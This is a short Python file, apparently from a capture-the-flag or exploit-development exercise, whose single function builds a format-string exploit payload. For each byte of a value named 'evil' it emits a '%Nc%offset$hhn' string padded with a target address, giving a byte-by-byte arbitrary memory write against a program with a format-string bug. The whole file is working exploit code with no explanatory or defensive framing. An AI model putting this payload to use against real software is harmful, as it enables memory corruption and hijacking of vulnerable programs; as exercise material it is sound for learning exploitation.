from util import *

def build_payload(addr, evil, offset = 11):
    res = b""
    # generate payload
    for i in range(8):
        ch = evil & 0xff
        evil = evil >> 8
        if ch == 0: ch += (1 << 8)
        payload = "%{0}c%{1}$hhn".format(ch, offset).encode('utf-8')
        assert(len(payload) < 16)
        payload = payload.ljust(16, b"A")
        payload += p64(addr + i)
        payload = payload.ljust(0x100, b"A")
        assert(len(payload) == 0x100)
        res += payload
    return res

